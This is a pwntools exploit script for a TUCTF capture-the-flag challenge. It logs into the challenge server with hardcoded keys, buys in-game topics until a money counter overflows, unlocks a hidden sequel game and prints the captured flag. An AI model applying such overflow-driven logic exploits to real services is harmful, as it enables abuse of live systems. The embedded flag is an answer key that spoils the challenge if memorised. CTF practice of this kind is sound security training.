import random
import string
from pwn import *
from time import sleep

recovery_key = "itstimetoplay"
validation_key = "(66,66-66,66&66,66-66,66)"

r = remote("nomansdungeon.tuctf.com", 6666)

print r.sendlineafter("continue: ", "")
print r.sendlineafter("> ", recovery_key)
print r.sendlineafter("continue.\n", "pwn")
r.sendline(validation_key)
print r.sendlineafter("> ", "greunion")

def create_sequel_game():
    print r.sendlineafter("> ", "1") # Create New Game
    print r.sendlineafter("> ", "5") # Set Game Topic to Sequel
    print r.sendlineafter("> ", "48")
    print r.sendlineafter("> ", "1") # 1) No Man's Dungeon
    r.sendline("pwn")  # not important, just needed to continue
    print r.sendlineafter("> ", "6") # Work on the Game to receive flag :D

def create_sequel_topic():
    for i in range(44): # buy all existing topics
        print r.sendlineafter("> ", "3") # View Status and Topics
        print r.sendlineafter("(Y/N) ", "Y")
        print r.sendlineafter("> ", "1")
    # create the sequel topic
    print r.sendlineafter("> ", "3") # View Status and Topics
    print r.sendlineafter("(Y/N) ", "Y")
    print r.sendlineafter("(Y/N) ", "Y")
    print r.sendlineafter("> ", "Sequel")
    # buy the sequel topic
    print r.sendlineafter("> ", "3") # View Status and Topics
    print r.sendlineafter("(Y/N) ", "Y")
    print r.sendlineafter("> ", "1")
    # overflow our money
    for i in range(12):
        # create random topic
        print r.sendlineafter("> ", "3") # View Status and Topics
        print r.sendlineafter("(Y/N) ", "Y")
        print r.sendlineafter("(Y/N) ", "Y")
        t = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        print r.sendlineafter("> ", t)
        # buy random topic
        print r.sendlineafter("> ", "3") # View Status and Topics
        print r.sendlineafter("(Y/N) ", "Y")
        print r.sendlineafter("> ", "1")

# create and buy topics until we overflow our budget!
create_sequel_topic()
# now create the sequel game to receive the flag
create_sequel_game()

r.interactive()

# TUCTF{G00DhaxSET5}
